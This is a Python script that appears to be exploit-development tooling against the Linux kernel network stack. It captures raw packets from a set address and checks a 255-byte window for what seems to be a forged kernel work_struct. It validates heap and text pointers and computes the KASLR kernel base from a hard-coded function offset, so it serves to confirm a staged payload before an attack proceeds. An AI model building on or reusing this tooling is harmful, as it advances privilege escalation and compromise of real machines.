#!/usr/bin/env python3
# Guest-side 255B-window self-check.  No sends: capture only.
# usage: r6selfcheck_guest.py <gw> <secs> <outfile>
import socket, struct, time, sys

IFACE = "enp1s0"
SRC = bytes([192, 168, 250, 1])       # listener address
DST = bytes([192, 168, 250, 114])     # guest
RT6_OFF = 0x10cbfd0
HEAP_LO = 0xffff888000000000
HEAP_HI = 0xffffc87fffffffff
TEXT_LO = 0xffffffff80000000
TEXT_HI = 0xffffffffc0000000

gw = int(sys.argv[1], 0) if len(sys.argv) > 1 else 0x7f00
secs = int(sys.argv[2]) if len(sys.argv) > 2 else 12
out = sys.argv[3] if len(sys.argv) > 3 else "/tmp/selfcheck-guest.txt"


def canonical_heap(x):
    return HEAP_LO <= x <= HEAP_HI and (x & 7) == 0 or (HEAP_LO <= x <= HEAP_HI)


def check(win, gw):
    data, nxt, prv, func = struct.unpack("<4Q", win[32:64])
    target = win[64:80]
    pwq = data & ~0xff
    kbase = (func - RT6_OFF) & 0xffffffffffffffff
    queued = ((data & 0x5) == 0x5) and (data >> 48) == 0xffff and (pwq & 0xff) == 0
    links = nxt == prv and HEAP_LO <= nxt <= HEAP_HI and (nxt & 0x3f) != 0x08
    func_ok = TEXT_LO <= func <= TEXT_HI
    kbase_ok = (kbase & 0x1fffff) == 0 and 0xffffffff80000000 <= kbase <= 0xffffffffc0000000
    w_eq = (target[:2] == b"\xfe\x80" and target[2:14] == b"\0" * 12
            and target[14:16] == struct.pack(">H", gw))
    rr = win[0] == 7 and win[1] == 11
    passed = queued and links and func_ok and kbase_ok and w_eq and rr
    return dict(data=data, next=nxt, prev=prv, func=func, pwq=pwq, kbase=kbase,
                target=target, queued=queued, links=links, func_ok=func_ok,
                kbase_ok=kbase_ok, w_eq=w_eq, rr=rr, passed=passed)


s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.bind((IFACE, 0))
s.settimeout(0.4)
deadline = time.time() + secs
idx = 0
with open(out, "w") as f:
    f.write("guest self-check gw=%#x secs=%d\n" % (gw, secs)); f.flush()
    while time.time() < deadline:
        try:
            fr = s.recv(65535)
        except socket.timeout:
            continue
        except Exception as e:
            f.write("ERR %s\n" % e); f.flush(); continue
        if len(fr) < 14 + 295:
            continue
        off = 14
        et = struct.unpack(">H", fr[12:14])[0]
        while et in (0x8100, 0x88a8) and len(fr) >= off + 4:
            et = struct.unpack(">H", fr[off + 2:off + 4])[0]; off += 4
        if et != 0x0800:
            continue
        ip = fr[off:]
        if len(ip) < 295 or ip[9] != 6:
            continue
        if bytes(ip[12:16]) != SRC or bytes(ip[16:20]) != DST:
            continue
        t = 20 + 255
        if struct.unpack(">H", ip[t:t + 2])[0] != 7778:
            continue
        dport = struct.unpack(">H", ip[t + 2:t + 4])[0]
        win = bytes(ip[20:275])
        r = check(win, gw)
        idx += 1
        f.write("GUESTSELF idx=%d dport=%d data=%#x next=%#x prev=%#x func=%#x "
                "target=%s queued=%s w_eq_v64=%s links=%s kbase=%#x kbase_ok=%s "
                "rr=%s PASS=%s\n" %
                (idx, dport, r["data"], r["next"], r["prev"], r["func"],
                 r["target"].hex(), r["queued"], r["w_eq"], r["links"],
                 r["kbase"], r["kbase_ok"], r["rr"], r["passed"]))
        f.flush()
print("done")
